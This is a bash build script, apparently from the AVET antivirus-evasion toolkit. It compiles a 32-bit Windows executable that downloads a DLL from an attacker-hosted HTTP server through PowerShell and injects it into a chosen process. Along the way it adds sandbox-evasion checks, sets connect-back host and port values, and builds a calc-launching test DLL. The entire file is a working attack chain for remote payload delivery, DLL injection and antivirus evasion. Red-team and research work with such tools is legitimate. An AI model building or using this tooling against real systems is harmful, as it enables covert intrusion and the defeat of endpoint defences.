#!/bin/bash
# Dll injection 32-bit example build script
# Creates an executable that injects a dll residing on the target's disk into a target process
# Also creates an exec_calc 32-bit dll payload, and downloads the file via powershell onto the target's disk for injection
# Target process and dll can be specified in the third(!) command line argument as format:		pid,dll_path

# Host the generated metasploit dll payload via HTTP on port 80
# Call the injector executable like:
# output.exe http://yourserver/thepayload.dll random target_pid,thepayload.dll
# "random" just fills argv[2], which is not needed here

# The download mechanism, as deployed here, is kind of a workaround to deliver the payload to the target.
# download_powershel is "abused" as payload source, so the file is downloaded and read into memory, but that buffer is not used to deliver the dll.
# Instead, the dll is read from disk (again) by the inject_dll payload execution method, and injected into the target process specified in payload_info.

# print AVET logo
cat banner.txt

# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh

# import global default lhost and lport values from build/global_connect_config.sh
. build/global_connect_config.sh

# override connect-back settings here, if necessary
LPORT=$GLOBAL_LPORT
LHOST=$GLOBAL_LHOST

# import feature construction interface
. build/feature_construction.sh

# compile exec_calc 32-bit dll payload from source
$win32_compiler test_payloads/exec_calc.c -shared -o output/exec_calc.dll

# add evasion techniques
add_evasion fopen_sandbox_evasion
add_evasion gethostbyname_sandbox_evasion
printf "\n#define HOSTVALUE \"this.that\"" >> source/evasion/evasion.include
reset_evasion_technique_counter

# payload will be downloaded from HTTP source via powershell
set_payload_source download_powershell

# no encoding, no key
# encoding/decoding would make no sense here, as the payload itself is not touched or read in by the executable after download
set_key_source none
set_decoder none

# retrieve payload info (target pid, dll path) from command line on execution
set_payload_info_source from_command_line_raw

# set payload execution method
set_payload_execution_method inject_dll

# enable debug output
enable_debug_print

# compile 
$win32_compiler -o output/output.exe source/avet.c -lws2_32
strip output/output.exe

# cleanup
cleanup_techniques